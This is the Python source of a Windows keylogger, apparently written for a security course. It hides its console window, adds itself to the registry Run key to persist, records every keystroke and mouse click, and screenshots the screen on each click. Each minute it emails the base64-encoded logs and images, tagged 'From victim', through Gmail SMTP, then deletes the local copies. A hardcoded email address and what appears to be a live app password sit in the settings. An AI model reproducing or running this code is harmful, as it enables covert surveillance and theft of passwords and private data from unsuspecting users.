# This keylogger was inspired by the following github project: https://github.com/D4Vinci/PyLoggy
import base64
import os
import smtplib
import sys
import time
from winreg import *

import pyautogui
import pythoncom
import pyWinhook
import win32console
import win32gui

#########Settings########
your_email = "comp6841student@gmail.com"  # What is your email?
your_email_pass = "fcfn euzu phly qzsb "  # What is your email password
interval = 60  # Time to wait before sending new data to email (in seconds)
########################

# Setting up
current_log = ""
log_file = "logfile.txt"
pics_names = []


def run_in_background():
    fp = os.path.dirname(os.path.realpath(__file__))
    file_name = sys.argv[0].split("\\")[-1]
    new_file_path = fp + "\\" + file_name
    keyVal = r"Software\Microsoft\Windows\CurrentVersion\Run"
    key2change = OpenKey(HKEY_CURRENT_USER, keyVal, 0, KEY_ALL_ACCESS)
    SetValueEx(key2change, "logger.py", 0, REG_SZ, new_file_path)
    win32gui.ShowWindow(win32console.GetConsoleWindow(), 0)


run_in_background()


def log():
    global current_log
    f = open(log_file, "ab")
    f.write(bytes(current_log, encoding="utf-8"))
    f.close()
    current_log = ""


def screen_shot():
    name = time.strftime("%Y_%m_%d_%H_%M_%S", time.gmtime()) + ".png"
    pics_names.append(name)
    pyautogui.screenshot().save(name)
    return name


def mail_it():
    global pics_names, start_time
    # reset timer to send again after interval
    start_time = time.time()
    # log all data accumulated so far
    log()
    # encode data to prepare for sending (also add extra information)
    data = base64.b64encode(open(log_file, "r+b").read())
    data = (
        b"Subject: (Base64 encoded) From victim|"
        + bytes(time.strftime("%Y_%m_%d_%H_%M_%S", time.gmtime()), encoding="utf-8")
        + b"logfile.txt\n\n"
        + data
    )
    # send email containing logfile
    server = smtplib.SMTP("smtp.gmail.com:587")
    server.starttls()
    server.login(your_email, your_email_pass)
    server.sendmail(your_email, your_email, data)

    # send an email for each image
    for pic in pics_names:
        data = base64.b64encode(open(pic, "r+b").read())
        data = (
            b"Subject: (Base64 encoded) From victim|"
            + bytes(pic, encoding="utf-8")
            + b"\n\n"
            + data
        )
        server.sendmail(your_email, your_email, data)
        # pathlib.Path(pic).unlink()
        os.unlink(pic)
    server.close()
    # delete pictures and logfile after mailing them
    pics_names.clear()
    open(log_file, "w").close()


def on_mouse_event(event):
    data = (
        time.strftime("%Y-%m-%d_%H:%M:%S", time.gmtime())
        + "\n\tWindow: "
        + str(event.WindowName)
    )
    data += check_special()
    data += "\n\tButton: " + str(event.MessageName)
    data += "\n\tPosition: " + str(event.Position)
    data += "\n\tScreenshot file: " + screen_shot() + "\n"

    global current_log
    current_log += data

    if (time.time() - start_time) >= interval:
        mail_it()

    return True


def on_keyboard_down(event):
    if change_special(event.Key, True):
        return True
    data = (
        time.strftime("%Y-%m-%d_%H:%M:%S", time.gmtime())
        + "\n\tWindow: "
        + str(event.WindowName)
    )
    data += check_special()
    data += (
        "\n\tKeyboard: "
        + (
            chr(event.Ascii)
            if event.Ascii >= 33 and event.Ascii <= 126
            else str(event.Key)
        )
        + "\n"
    )

    global current_log
    current_log += data

    if (time.time() - start_time) >= interval:
        mail_it()

    if modifiers["ctrl"] and event.Key == "Escape":
        mail_it()
        exit()
    return True


def on_keyboard_release(event):
    change_special(event.Key, False)
    return True


# track if special keys held down
modifiers = {"ctrl": False, "shift": False, "alt": False}


def change_special(key, value):
    if key in ["Lshift", "Rshift"]:
        modifiers["shift"] = value
    elif key in ["Lcontrol", "Rcontrol"]:
        modifiers["ctrl"] = value
    elif key in ["Lmenu", "Rmenu"]:
        modifiers["alt"] = value
    else:
        return False
    return True


def check_special():
    mods = "ctrl + " if modifiers["ctrl"] else ""
    mods += "shift + " if modifiers["shift"] else ""
    mods += "alt + " if modifiers["alt"] else ""
    mods = mods.removesuffix(" + ")
    if mods:
        return "\n\tModifiers: " + mods
    return ""


hook = pyWinhook.HookManager()
hook.KeyDown = on_keyboard_down
hook.KeyUp = on_keyboard_release
hook.MouseAllButtonsDown = on_mouse_event
hook.HookKeyboard()
hook.HookMouse()

start_time = time.time()

pythoncom.PumpMessages()
